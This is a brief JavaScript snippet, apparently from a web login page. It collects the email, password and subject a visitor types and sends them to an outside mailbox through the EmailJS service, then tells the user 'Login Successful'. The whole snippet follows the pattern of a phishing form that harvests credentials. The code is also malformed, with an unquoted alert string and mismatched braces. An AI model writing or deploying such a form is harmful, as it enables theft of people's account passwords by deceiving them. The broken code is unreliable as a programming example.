  
  function sendMail(){
    let parms = {
        email : document.getElementById("email").value,
        password : document.getElementById("password").value,
        subject : document.getElementById("subject").value,
        
    }
    
    emailjs.send("service_hdccajt", "template_wz9eg9e",parms).then(alert(Login Successful)}
}


